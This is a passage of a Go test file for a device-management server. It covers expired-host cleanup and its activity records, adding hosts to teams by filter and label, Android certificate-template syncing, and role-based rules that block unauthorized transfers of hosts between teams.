	mockClock := clock.NewMockClock()

	// Create expired hosts for Team 1 (use team1ExpiryWindow)
	team1ExpiredTime := mockClock.Now().Add(-time.Duration(team1ExpiryWindow+1) * 24 * time.Hour)
	host1 := test.NewHost(t, ds, "team1-host1", "192.168.1.10", "1", "1", team1ExpiredTime)
	host1.HardwareSerial = "TEAM1_SERIAL1"
	host1.ComputerName = "Team 1 Computer 1"
	err = ds.UpdateHost(ctx, host1)
	require.NoError(t, err)
	require.NoError(t, ds.AddHostsToTeam(ctx, automdm.NewAddHostsToTeamParams(&team1.ID, []uint{host1.ID})))
	host1.TeamID = &team1.ID

	host2 := test.NewHost(t, ds, "team1-host2", "192.168.1.11", "2", "2", team1ExpiredTime)
	host2.HardwareSerial = "TEAM1_SERIAL2"
	host2.ComputerName = "Team 1 Computer 2"
	err = ds.UpdateHost(ctx, host2)
	require.NoError(t, err)
	require.NoError(t, ds.AddHostsToTeam(ctx, automdm.NewAddHostsToTeamParams(&team1.ID, []uint{host2.ID})))
	host2.TeamID = &team1.ID

	// Create expired host for Team 2 (use team2ExpiryWindow)
	team2ExpiredTime := mockClock.Now().Add(-time.Duration(team2ExpiryWindow+1) * 24 * time.Hour)
	host3 := test.NewHost(t, ds, "team2-host1", "192.168.1.12", "3", "3", team2ExpiredTime)
	host3.HardwareSerial = "TEAM2_SERIAL1"
	host3.ComputerName = "Team 2 Computer 1"
	err = ds.UpdateHost(ctx, host3)
	require.NoError(t, err)
	require.NoError(t, ds.AddHostsToTeam(ctx, automdm.NewAddHostsToTeamParams(&team2.ID, []uint{host3.ID})))
	host3.TeamID = &team2.ID

	// Create expired host for Team 3 (uses global expiry)
	globalExpiredTime := mockClock.Now().Add(-time.Duration(globalExpiryWindow+1) * 24 * time.Hour)
	host4 := test.NewHost(t, ds, "team3-host1", "192.168.1.13", "4", "4", globalExpiredTime)
	host4.HardwareSerial = "TEAM3_SERIAL1"
	host4.ComputerName = "Team 3 Computer 1"
	err = ds.UpdateHost(ctx, host4)
	require.NoError(t, err)
	require.NoError(t, ds.AddHostsToTeam(ctx, automdm.NewAddHostsToTeamParams(&team3.ID, []uint{host4.ID})))
	host4.TeamID = &team3.ID

	// Create expired host with no team (uses global expiry)
	host5 := test.NewHost(t, ds, "no-team-host", "192.168.1.14", "5", "5", globalExpiredTime)
	host5.HardwareSerial = "NOTEAM_SERIAL1"
	host5.ComputerName = "No Team Computer 1"
	host5.TeamID = nil
	err = ds.UpdateHost(ctx, host5)
	require.NoError(t, err)

	// Get activities before cleanup
	prevActivities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{})

	// Run the cleanup service method
	deletedHosts, err := svc.CleanupExpiredHostsBatch(ctx, 100)
	require.NoError(t, err)
	require.Len(t, deletedHosts, 5, "Should have deleted 5 hosts")

	// Verify activities were created
	activities := mysqltest.ListActivitiesAPI(t, ctx, activitySvc, activity_api.ListOptions{
		OrderKey:       "id",
		OrderDirection: activity_api.OrderDescending,
		PerPage:        20,
	})
	require.Greater(t, len(activities), len(prevActivities), "Should have new activities")

	// Collect all deleted host activities
	type hostActivity struct {
		hostID       uint
		displayName  string
		serial       string
		expiryWindow int
	}

	deletedHostActivities := []hostActivity{}
	expectedActivityType := automdm.ActivityTypeDeletedHost{}.ActivityName()

	for _, activity := range activities {
		if activity.Type != expectedActivityType {
			continue
		}
		require.NotNil(t, activity.Details)

		var details automdm.ActivityTypeDeletedHost
		err = json.Unmarshal(*activity.Details, &details)
		require.NoError(t, err)

		if details.TriggeredBy == automdm.DeletedHostTriggeredByExpiration {
			require.NotNil(t, details.HostExpiryWindow, "HostExpiryWindow should be set for expired hosts")
			deletedHostActivities = append(deletedHostActivities, hostActivity{
				hostID:       details.HostID,
				displayName:  details.HostDisplayName,
				serial:       details.HostSerial,
				expiryWindow: *details.HostExpiryWindow,
			})
		}
	}

	require.Len(t, deletedHostActivities, 5, "Should have 5 deleted host activities")

	// Verify each host has the correct expiry window
	for _, ha := range deletedHostActivities {
		switch ha.hostID {
		case host1.ID:
			require.Equal(t, "Team 1 Computer 1", ha.displayName)
			require.Equal(t, "TEAM1_SERIAL1", ha.serial)
			require.Equal(t, team1ExpiryWindow, ha.expiryWindow, "Team 1 host should have team1 expiry window")
		case host2.ID:
			require.Equal(t, "Team 1 Computer 2", ha.displayName)
			require.Equal(t, "TEAM1_SERIAL2", ha.serial)
			require.Equal(t, team1ExpiryWindow, ha.expiryWindow, "Team 1 host should have team1 expiry window")
		case host3.ID:
			require.Equal(t, "Team 2 Computer 1", ha.displayName)
			require.Equal(t, "TEAM2_SERIAL1", ha.serial)
			require.Equal(t, team2ExpiryWindow, ha.expiryWindow, "Team 2 host should have team2 expiry window")
		case host4.ID:
			require.Equal(t, "Team 3 Computer 1", ha.displayName)
			require.Equal(t, "TEAM3_SERIAL1", ha.serial)
			require.Equal(t, globalExpiryWindow, ha.expiryWindow, "Team 3 host should use global expiry window")
		case host5.ID:
			require.Equal(t, "No Team Computer 1", ha.displayName)
			require.Equal(t, "NOTEAM_SERIAL1", ha.serial)
			require.Equal(t, globalExpiryWindow, ha.expiryWindow, "No team host should use global expiry window")
		default:
			t.Fatalf("Unexpected host ID in activities: %d", ha.hostID)
		}
	}

	// Verify CleanupHostActivities was called with all expired host IDs.
	require.True(t, opts.ActivityMock.CleanupHostActivitiesFuncInvoked)
	require.ElementsMatch(t, []uint{host1.ID, host2.ID, host3.ID, host4.ID, host5.ID}, cleanedHostIDs)
}

func TestAddHostsToTeamByFilter(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	expectedHostIDs := []uint{1, 2, 4}
	expectedTeam := (*uint)(nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		var hosts []*automdm.Host
		for _, id := range expectedHostIDs {
			hosts = append(hosts, &automdm.Host{ID: id})
		}
		return hosts, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		assert.Equal(t, expectedTeam, params.TeamID)
		assert.Equal(t, expectedHostIDs, params.HostIDs)
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return nil, nil
	}

	emptyRequest := &map[string]interface{}{}

	require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), expectedTeam, emptyRequest))
	assert.True(t, ds.ListHostsFuncInvoked)
	assert.True(t, ds.AddHostsToTeamFuncInvoked)
}

func TestAddHostsToTeamByFilterLabel(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	expectedHostIDs := []uint{6}
	expectedTeam := new(uint(1))
	expectedLabel := float64(2)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListHostsInLabelFunc = func(ctx context.Context, filter automdm.TeamFilter, lid uint, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		assert.Equal(t, uint(expectedLabel), lid)
		var hosts []*automdm.Host
		for _, id := range expectedHostIDs {
			hosts = append(hosts, &automdm.Host{ID: id})
		}
		return hosts, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		assert.Equal(t, expectedHostIDs, params.HostIDs)
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return nil, nil
	}

	filter := &map[string]interface{}{"label_id": expectedLabel}

	require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), expectedTeam, filter))
	assert.True(t, ds.ListHostsInLabelFuncInvoked)
	assert.True(t, ds.AddHostsToTeamFuncInvoked)
}

func TestAddHostsToTeamByFilterEmptyHosts(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}

	emptyFilter := &map[string]interface{}{}

	require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), nil, emptyFilter))
	assert.True(t, ds.ListHostsFuncInvoked)
	assert.False(t, ds.AddHostsToTeamFuncInvoked)
}

func TestAddHostsToTeamAndroidCertTemplates(t *testing.T) {
	ds := new(mock.Store)
	cfg := config.TestConfig()
	cfg.MDM.AndroidAgent.Package = "com.fleetdm.agent"
	svc, ctx := newTestServiceWithConfig(t, ds, cfg, nil, nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
		return []*automdm.Host{{ID: 1}}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (automdm.MDMProfilesUpdates, error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.GetEnterpriseFunc = func(ctx context.Context) (*android.Enterprise, error) {
		return &android.Enterprise{EnterpriseID: "LC0test"}, nil
	}
	ds.NewJobFunc = func(ctx context.Context, job *automdm.Job) (*automdm.Job, error) {
		return job, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
		return nil
	}
	ds.SetHostAndroidSoftwareInstallsNeedsResendFunc = func(ctx context.Context, hostIDs []uint, builtAfter *time.Time, adamID *string) error {
		return nil
	}

	t.Run("transfer to team creates pending cert templates and syncs android_devices team_id", func(t *testing.T) {
		var certUUID string
		var certTeamID uint
		ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked = false
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		ds.CreatePendingCertificateTemplatesForNewHostFunc = func(ctx context.Context, hostUUID string, teamID uint) (int64, error) {
			certUUID = hostUUID
			certTeamID = teamID
			return 1, nil
		}
		var syncedUUIDs []string
		var syncedTeamID *uint
		ds.UpdateTeamIDOnAndroidDevicesFuncInvoked = false
		ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
			syncedUUIDs = hostUUIDs
			syncedTeamID = teamID
			return nil
		}

		require.NoError(t, svc.AddHostsToTeam(test.UserContext(ctx, test.UserAdmin), new(uint(5)), []uint{1}))
		assert.True(t, ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked)
		assert.Equal(t, "android-uuid-1", certUUID)
		assert.Equal(t, uint(5), certTeamID)
		assert.True(t, ds.UpdateTeamIDOnAndroidDevicesFuncInvoked)
		assert.Equal(t, []string{"android-uuid-1"}, syncedUUIDs)
		require.NotNil(t, syncedTeamID)
		assert.Equal(t, uint(5), *syncedTeamID)
	})

	t.Run("transfer to no team uses teamID 0 and syncs nil team_id", func(t *testing.T) {
		ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked = false
		ds.UpdateTeamIDOnAndroidDevicesFuncInvoked = false
		var certTeamID uint
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		ds.CreatePendingCertificateTemplatesForNewHostFunc = func(ctx context.Context, hostUUID string, teamID uint) (int64, error) {
			certTeamID = teamID
			return 1, nil
		}
		var syncedTeamID *uint
		ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
			syncedTeamID = teamID
			return nil
		}

		require.NoError(t, svc.AddHostsToTeam(test.UserContext(ctx, test.UserAdmin), nil, []uint{1}))
		assert.True(t, ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked)
		assert.Equal(t, uint(0), certTeamID)
		assert.True(t, ds.UpdateTeamIDOnAndroidDevicesFuncInvoked)
		assert.Nil(t, syncedTeamID)
	})

	t.Run("no android hosts skips cert templates and team sync", func(t *testing.T) {
		ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked = false
		ds.UpdateTeamIDOnAndroidDevicesFuncInvoked = false
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return nil, nil
		}

		require.NoError(t, svc.AddHostsToTeam(test.UserContext(ctx, test.UserAdmin), new(uint(5)), []uint{1}))
		assert.False(t, ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked)
		assert.False(t, ds.UpdateTeamIDOnAndroidDevicesFuncInvoked)
	})

	t.Run("transfer of an android host flags its agent for resend in the request", func(t *testing.T) {
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		var flaggedHostIDs []uint
		var flaggedAdamID *string
		ds.SetHostAndroidSoftwareInstallsNeedsResendFunc = func(ctx context.Context, hostIDs []uint, builtAfter *time.Time, adamID *string) error {
			require.Nil(t, builtAfter)
			flaggedHostIDs = hostIDs
			flaggedAdamID = adamID
			return nil
		}

		// transfer the android host, its agent's row should be flagged for resend before the request returns
		require.NoError(t, svc.AddHostsToTeam(test.UserContext(ctx, test.UserAdmin), new(uint(5)), []uint{1}))
		assert.Equal(t, []uint{1}, flaggedHostIDs)
		require.NotNil(t, flaggedAdamID)
		assert.Equal(t, "com.fleetdm.agent", *flaggedAdamID)
	})
}

func TestAddHostsToTeamByFilterAndroidCertTemplates(t *testing.T) {
	ds := new(mock.Store)
	cfg := config.TestConfig()
	cfg.MDM.AndroidAgent.Package = "com.fleetdm.agent"
	svc, ctx := newTestServiceWithConfig(t, ds, cfg, nil, nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return []*automdm.Host{{ID: 1}}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (automdm.MDMProfilesUpdates, error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.GetEnterpriseFunc = func(ctx context.Context) (*android.Enterprise, error) {
		return &android.Enterprise{EnterpriseID: "LC0test"}, nil
	}
	ds.NewJobFunc = func(ctx context.Context, job *automdm.Job) (*automdm.Job, error) {
		return job, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
		return nil
	}
	ds.SetHostAndroidSoftwareInstallsNeedsResendFunc = func(ctx context.Context, hostIDs []uint, builtAfter *time.Time, adamID *string) error {
		return nil
	}

	t.Run("transfer to team creates pending cert templates and syncs android_devices team_id", func(t *testing.T) {
		var certUUID string
		var certTeamID uint
		ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked = false
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		ds.CreatePendingCertificateTemplatesForNewHostFunc = func(ctx context.Context, hostUUID string, teamID uint) (int64, error) {
			certUUID = hostUUID
			certTeamID = teamID
			return 1, nil
		}
		var syncedUUIDs []string
		var syncedTeamID *uint
		ds.UpdateTeamIDOnAndroidDevicesFuncInvoked = false
		ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
			syncedUUIDs = hostUUIDs
			syncedTeamID = teamID
			return nil
		}

		emptyFilter := &map[string]any{}
		require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), new(uint(5)), emptyFilter))
		assert.True(t, ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked)
		assert.Equal(t, "android-uuid-1", certUUID)
		assert.Equal(t, uint(5), certTeamID)
		assert.True(t, ds.UpdateTeamIDOnAndroidDevicesFuncInvoked)
		assert.Equal(t, []string{"android-uuid-1"}, syncedUUIDs)
		require.NotNil(t, syncedTeamID)
		assert.Equal(t, uint(5), *syncedTeamID)
	})

	t.Run("transfer to no team uses teamID 0 and syncs nil team_id", func(t *testing.T) {
		ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked = false
		ds.UpdateTeamIDOnAndroidDevicesFuncInvoked = false
		var certTeamID uint
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		ds.CreatePendingCertificateTemplatesForNewHostFunc = func(ctx context.Context, hostUUID string, teamID uint) (int64, error) {
			certTeamID = teamID
			return 1, nil
		}
		var syncedTeamID *uint
		ds.UpdateTeamIDOnAndroidDevicesFunc = func(ctx context.Context, hostUUIDs []string, teamID *uint) error {
			syncedTeamID = teamID
			return nil
		}

		emptyFilter := &map[string]any{}
		require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), nil, emptyFilter))
		assert.True(t, ds.CreatePendingCertificateTemplatesForNewHostFuncInvoked)
		assert.Equal(t, uint(0), certTeamID)
		assert.True(t, ds.UpdateTeamIDOnAndroidDevicesFuncInvoked)
		assert.Nil(t, syncedTeamID)
	})

	t.Run("transfer of an android host by filter flags its agent for resend in the request", func(t *testing.T) {
		ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
			return map[string]uint{"android-uuid-1": 1}, nil
		}
		var flaggedHostIDs []uint
		var flaggedAdamID *string
		ds.SetHostAndroidSoftwareInstallsNeedsResendFunc = func(ctx context.Context, hostIDs []uint, builtAfter *time.Time, adamID *string) error {
			require.Nil(t, builtAfter)
			flaggedHostIDs = hostIDs
			flaggedAdamID = adamID
			return nil
		}

		// transfer the android host by filter, its agent's row should be flagged for resend before the request returns
		emptyFilter := &map[string]any{}
		require.NoError(t, svc.AddHostsToTeamByFilter(test.UserContext(ctx, test.UserAdmin), new(uint(5)), emptyFilter))
		assert.Equal(t, []uint{1}, flaggedHostIDs)
		require.NotNil(t, flaggedAdamID)
		assert.Equal(t, "com.fleetdm.agent", *flaggedAdamID)
	})
}

func TestAddHostsToTeamSourceTeamAuth(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return map[string]uint{}, nil
	}

	// A team-scoped caller has no read visibility into hosts outside their
	// team(s), so a source-team authorization failure must surface as
	// NotFound rather than a Forbidden that would confirm the host exists.
	t.Run("team maintainer cannot steal host from another team", func(t *testing.T) {
		// Host 10 belongs to team 2, team 1 maintainer tries to transfer it to team 1
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamMaintainerTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrNotFound, err)
	})

	t.Run("team admin cannot steal host from another team", func(t *testing.T) {
		// Host 10 belongs to team 2, team 1 admin tries to transfer it to team 1
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamAdminTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrNotFound, err)
	})

	t.Run("team maintainer cannot steal host from no-team", func(t *testing.T) {
		// Host 10 has no team (global), team 1 maintainer tries to transfer it to team 1
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: nil},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamMaintainerTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrNotFound, err)
	})

	t.Run("global admin can transfer host across teams", func(t *testing.T) {
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserAdmin)
		ds.BulkSetPendingMDMHostProfilesFuncInvoked = false
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
		require.True(t, ds.BulkSetPendingMDMHostProfilesFuncInvoked)
	})

	t.Run("global maintainer can transfer host across teams", func(t *testing.T) {
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserMaintainer)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("team maintainer can transfer host within own team", func(t *testing.T) {
		// Host 10 already in team 1, team 1 maintainer moves it to team 1 (no-op effectively)
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamMaintainerTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("mixed hosts - blocked if any source team is unauthorized", func(t *testing.T) {
		// Host 10 in team 1 (ok), host 11 in team 2 (not ok) - team 1 maintainer
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
				{ID: 11, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamMaintainerTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10, 11})
		test.RequireErrKind(t, test.ErrNotFound, err)
	})

	t.Run("multi-team admin+maintainer can transfer hosts between their teams", func(t *testing.T) {
		multiTeamUser := &automdm.User{
			ID: 99,
			Teams: []automdm.UserTeam{
				{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin},
				{Team: automdm.Team{ID: 2}, Role: automdm.RoleMaintainer},
			},
		}
		// Transfer host from team 2 to team 1
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, multiTeamUser)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)

		// Transfer host from team 1 to team 2
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		err = svc.AddHostsToTeam(userCtx, new(uint(2)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("multi-team admin+observer cannot transfer hosts to or from observed team", func(t *testing.T) {
		multiTeamUser := &automdm.User{
			ID: 100,
			Teams: []automdm.UserTeam{
				{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin},
				{Team: automdm.Team{ID: 2}, Role: automdm.RoleObserver},
			},
		}
		// Transfer host from team 2 (observer) to team 1 (admin) — blocked on
		// source. The observer can read the host, so this stays a Forbidden
		// rather than being masked as NotFound: nothing new is disclosed.
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, multiTeamUser)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		test.RequireErrKind(t, test.ErrForbidden, err)

		// Transfer host from team 1 (admin) to team 2 (observer) — blocked on destination
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(1))},
			}, nil
		}
		err = svc.AddHostsToTeam(userCtx, new(uint(2)), []uint{10})
		test.RequireErrKind(t, test.ErrForbidden, err)
	})

	t.Run("global technician can transfer hosts across teams", func(t *testing.T) {
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTechnician)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("global technician can transfer hosts to and from no team", func(t *testing.T) {
		// Host currently in team 2, transfer to no team (Unassigned).
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTechnician)
		err := svc.AddHostsToTeam(userCtx, nil, []uint{10})
		require.NoError(t, err)

		// Host currently in no team, transfer to team 1.
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: nil},
			}, nil
		}
		err = svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("team technician can transfer host between own teams", func(t *testing.T) {
		// User is technician on both team 1 and team 2; transfer host from team 2 to team 1.
		multiTeamTechnician := &automdm.User{
			ID: 200,
			Teams: []automdm.UserTeam{
				{Team: automdm.Team{ID: 1}, Role: automdm.RoleTechnician},
				{Team: automdm.Team{ID: 2}, Role: automdm.RoleTechnician},
			},
		}
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, multiTeamTechnician)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
		require.NoError(t, err)
	})

	t.Run("team technician cannot steal host from a team they don't manage", func(t *testing.T) {
		// Host 10 belongs to team 2, team 1 technician tries to transfer it to team 1.
		ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
			return []*automdm.Host{
				{ID: 10, TeamID: new(uint(2))},
			}, nil
		}
		userCtx := test.UserContext(ctx, test.UserTeamTechnicianTeam1)
		err := svc.AddHostsToTeam(userCtx, new(uint(1)), []uint{10})
